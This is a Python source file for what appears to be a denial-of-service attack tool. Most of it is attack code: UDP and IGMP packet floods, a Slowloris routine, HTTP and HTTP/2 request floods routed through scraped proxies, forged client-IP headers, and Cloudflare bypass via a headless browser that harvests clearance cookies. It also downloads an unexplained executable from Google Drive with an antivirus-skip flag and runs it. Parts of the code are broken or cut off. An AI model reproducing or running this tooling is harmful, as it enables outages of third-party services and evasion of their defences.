# -*- coding: utf-8 -*-
#!/usr/bin/env python3
#какой аура? Вообще-то автор я @jc_lifemiles (меня держат в заложниках.работаю за бесплатно. даже  еду не дают. помогите)
"""
  ┯━━━━━━━━▧▣▧━━━━━━━━┯
  ━━━━━━━┛ ✠ ┗━━━━━━━━
  
         Author:
        @AuraNett
  
  ━━━━━━━┓ ✠ ┏━━━━━━━━
  ┷━━━━━━━━▧▣▧━━━━━━━━┷
"""

def warn(*args, **kwargs):
    pass
import wget
from itertools import count
import shutil
import requests as r, os, threading, random
import shutup; shutup.please() # pip3 install shutup
import warnings; warnings.filterwarnings("ignore"); warnings.simplefilter("ignore"); warnings.warn = warn
from threading import Thread
import cmd
from pystyle import Colors, Colorate, Center
import colorama
import requests
import random
import string
import sys
import pcpy
import cmd
import time
import os
import urllib.request
import re
from os import system, name, mkdir,rmdir
import httpx
import undetected_chromedriver as webdriver
from httpx import AsyncClient, Headers
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random, socket, sys
with warnings.catch_warnings():
    warnings.filterwarnings("ignore",category=DeprecationWarning)
    import socket
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init,Style,Back
from flask import request
from flask import jsonify
from pystyle import *

def checkExtraMethod():
    # Проверка TCP
    try:
        ctcp = open('tc.exe')
    except:
        print(Fore.MAGENTA + 'Downloading extra method..')
        wget.download('https://drive.google.com/uc?export=download&confirm=no_antivirus&id=1NLUkyA5M-rKQnm6rBQrnwbZreonzFf8D')
        print(Fore.MAGENTA + 'Downloaded!')

init(convert=True)
def countdown(t):
    os.system('cls')
    printf(Center.XCenter(Colorate.Horizontal(Colors.red_to_purple,  f'''
                    
                 ▄▀█ ▀█▀ ▀█▀ ▄▀█ █▀▀ █▄▀   █▀ █▀▀ █▄░█ ▀█▀
                 █▀█ ░█░ ░█░ █▀█ █▄▄ █░█   ▄█ ██▄ █░▀█ ░█░
Atacking....
'''), True), end='')
    print("")
    print("")
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack status => " + str(
                (until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            os.system('cls')
            printf(Center.XCenter(Colorate.Horizontal(Colors.red_to_purple,  f'''
                      ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔╦╗╔═╗╔╗╔╔═╗
                      ╠═╣ ║  ║ ╠═╣║  ╠╩╗   ║║║ ║║║║║╣ 
                      ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ═╩╝╚═╝╝╚╝╚═╝
Attacking....
'''), True), end='')
            print("")
            print("")
            stdout.flush()
            stdout.write(
                "\r " + Fore.MAGENTA + "[*]" + Fore.WHITE + " Attack Done !                                                          \n")
            return


method = [
    "GET",
    "POST",
    "HEAD",
]

proxyResources = [
    'https://api.scrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
]
socksFile= "socks5.txt"
#GET SOCKS
def socksCrawler():
    global socksFile, socksResources
    f = open(socksFile,'wb')
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()


# region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target


def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get(
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("proxy.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get(
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("proxy.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r


def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + " You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r', encoding='utf8', errors='ignore').read().split('\n')
    return True

ip = r.post("http://fsystem88.ru/ip").text #thank u fsystem))

def get_cookie(target):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
        '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(target)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                "Accept-language: en-US,en,q=0.5"
                ]

def init_socket(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((str(urlparse(target).netloc), int(443)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))
    return s

def pyloris():
    socket_count= int(150)
    socket_list=[]
    for _ in range(int(socket_count)):
        try:
            s=init_socket(target, 443)
        except socket.error:
            break
        socket_list.append(s)
    print("Sockets inited")
    while True:
        print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))
        for s in socket_list:
            try:
                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)
        for _ in range(socket_count - len(socket_list)):
            print("\033[1;34;40m {}Re-creating Socket...".format("\n"))
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break
        time.sleep(timer)

def steal_proxies(site):
    try:
        data = requests.get(site)
        text_for_parse = data.text
        res = text_for_parse.split()
        with open('proxy.txt', 'a', encoding='utf8', errors='ignore') as proxy_file:
            proxy_file.writelines('\n'.join(res))
        return True
    except Exception as Error:
        return Error


def count_proxies():
    try:
        proxies = sum(1 for line in open('proxy.txt', 'r'))
        return proxies
    except Exception as Error:
        return Error


def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-target: {target['target']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )


##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL     " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

def get_ddos_pro():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    return target

def get_hulk_pro():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "METHOD      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    method = input()
    return target, method

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "IP       " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "PORT     " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t


##############################################################################################

# region layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass
#mine dos
def runmine(target, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=mine, args=(target, port, rand, until))
            thd.start()
        except:
            pass

def mine(target, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (target, int(port)))
        except:
            sock.close()
            pass
#vse dos
def runvse(target, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=vse, args=(target, port, rand, until))
            thd.start()
        except:
            pass

def vse(target, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (target, int(port)))
        except:
            sock.close()
            pass
def tcpcustom(target, port, threads, time):
    os.system(f"tc.exe {target} {port} {threads} {time}")
def httpbypass(target):
    os.system(f"python 1.py {target}")
def panupong(target, method):
    os.system(f'hulk.exe -site {target} -data {method}')
# region PROXY
##############################################
def check(ip, prox, qtime):
    try:
        ipx = r.get("http://fsystem88.ru/ip", proxies={'http':'http://{}'.format(prox), 'https':'http://{}'.format(prox)}, timeout=qtime).text
    except:
        ipx = ip
    if ip != ipx:
        print(Fore.GREEN+"{} good!".format(prox))
        f = open("proxy.txt", "a+")
        f.write("{}\n".format(prox))
        f.close()
    else:
        print(Fore.RED+"{} bad".format(prox))
##############################################
# endregion

# region HEAD


def LaunchHEAD(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(target, until))
            thd.start()
        except:
            pass


def AttackHEAD(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(target)
            requests.head(target)
        except:
            pass
#endregion

# region POST
def LaunchPOST(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(target, until))
            thd.start()
        except:
            pass


def AttackPOST(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(target)
            requests.post(target)
        except:
            pass


# endregion

# region RAW
def LaunchRAW(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(target, until))
            thd.start()
        except:
            pass


def AttackRAW(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(target)
            requests.get(target)
        except:
            pass


# endregion

# region PXRAW
def LaunchPXRAW(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(target, until))
            thd.start()
        except:
            pass


def AttackPXRAW(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://' + str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,
            'https': proxy,
        }
        try:
            requests.get(target, proxies=proxy)
            requests.get(target, proxies=proxy)
        except:
            pass


# endregion

# region PXSOC
def LaunchPXSOC(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\n"
    req += "target: " + target['target'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target[4] == 's':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect(str(target), int(443))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect(str(target), int(80))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return

# endregion

# region SOC
def LaunchSOC(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target('target') + " HTTP/1.1\r\nHost: " + target('target') + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass


def AttackSOC(target, until_datetime, req):
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect(str(target), int(443))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect(str(target), int(80))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


# endregion

def LaunchPPS(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.start()
        except:
            pass


def AttackPPS(target, until_datetime):  #
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
        except:
            pass

def LaunchNULL(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\nHost: " + target['target'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass


def AttackNULL(target, until_datetime, req):  #
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


def LaunchSPOOF(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\nHost: " + target['target'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass


def AttackSPOOF(target, until_datetime, req):  #
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


def LaunchPXSPOOF(target, thread, t, proxy):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\nHost: " + target['target'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass


def AttackPXSPOOF(target, until_datetime, req, proxy):  #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target[4] == 's':
            s = socks.socksocket()
            # s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['target']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
        else:
            s = socks.socksocket()
            # s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['target']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#region pxhttp
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled
#spoofmethod
def attackspoofv2(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchspoofv2, args=(url, timer)).start()

def Launchspoofv2(url, timer):
    socksCrawler()  
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
    req += "Via: "+spoofer()+"\r\n"
    req += "Client-IP: "+spoofer()+"\r\n"
    req += "X-Forwarded-For: "+spoofer()+"\r\n"
    req += "Real-IP: "+spoofer()+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#end region

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#region pxhulk
def attackPXHULK(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchPXHULK, args=(url, timer)).start()

def LaunchPXHULK(url, timer):
    socksCrawler()  
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m +"?="+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

# region CFB
def LaunchCFB(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(target, until, scraper))
            thd.start()
        except:
            pass


def AttackCFB(target, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(target, timeout=15)
            scraper.get(target, timeout=15)
        except:
            pass           
#end

#http2
def attackhttp2(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchhttp2, args=(url, timer)).start()

def Launchhttp2(url, timer):
        timelol = time.time() + int(timer)
        while time.time() < timelol:
            headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
 #           'TE': 'trailers',
            }
            proxfile1 = 'http.txt'
            prox1 = list(map(lambda x:x.strip(),open(proxfile1)))
            value = random.randint(65565, 314159)
            proxy1 = random.choice(prox1)
            proxies = ['http://'+proxy1]
  #          timeout = httpx.Timeout(None, connect=None)
    #        limits = httpx.Limits(max_keepalive_connections=None, max_connections=None) 
            with httpx.Client(http2=True,proxies=random.choice(proxies),headers=headers,trust_env=False) as client:
                try:
                    while True:
                        for _ in range(400):
                            r1 = client.get(url)
                            r2 = client.post(url, data={'login': value})
                            r3 = client.put(url, data={'login': value})
                            r5 = client.head(url)
                except httpx.HTTPError as exc:
                   pass




# endregion

# region PXCFB
def LaunchPXCFB(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(target, until, scraper))
            thd.start()
        except:
            pass


def AttackPXCFB(target, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                'http': 'http://' + str(random.choice(list(proxies))),
                'https': 'http://' + str(random.choice(list(proxies))),
            }
            scraper.get(target, proxies=proxy)
            scraper.get(target, proxies=proxy)
        except:
            pass


# endregion

# region CFPRO
def LaunchCFPRO(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(target, until, scraper))
            thd.start()
        except:
            pass


def AttackCFPRO(target, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(target=target, headers=headers, allow_redirects=False)
            scraper.get(target=target, headers=headers, allow_redirects=False)
        except:
            pass


# endregion
#region CFPRO
def LaunchCFPRO(target, thread, t):
